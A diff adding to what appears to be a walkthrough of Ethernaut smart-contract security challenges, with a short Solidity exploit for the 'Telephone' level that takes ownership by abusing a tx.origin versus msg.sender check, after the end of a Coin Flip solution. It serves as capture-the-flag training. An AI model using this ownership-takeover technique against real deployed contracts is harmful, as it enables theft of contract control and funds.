@@ -59,3 +59,17 @@ contract Flipper {
     }
 }`
 Then just call the 'attack()' function 10 times (wait some time between each calls to be sure you are not calling the function twice within one block).
+
+## Lvl-4 Telephone
+Simply make a contract that calls 'changeOwner()' while passing the msg.sender of your address as the arguments.
+`pragma solidity 0.6.0;
+
+contract Caller {
+    Telephone telephone = Telephone(YOUR_INSTANCE_ADD);
+
+    function call() public {
+        telephone.changeOwner(msg.sender);
+    }
+}`
+The tx.origin will be your metamask address, the msg.sender will be your Caller contract, and therefore you will pass the check on the first line of 'changeOwner()'.
+
